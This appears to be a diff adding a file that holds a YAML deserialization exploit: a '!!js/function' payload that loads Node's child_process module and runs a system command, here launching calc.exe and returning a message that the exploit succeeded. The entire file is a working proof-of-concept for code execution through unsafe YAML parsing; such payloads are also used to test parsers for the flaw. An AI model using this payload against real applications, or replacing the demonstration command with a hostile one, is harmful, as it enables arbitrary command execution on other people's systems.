@@ -1,0 +1,7 @@
+!!js/function >
+  function() {
+    const cp = global.process.mainModule.require('child_process');
+    cp.execSync('calc.exe');
+    return "Calculator opened! Exploit succeeded";
+  }
+
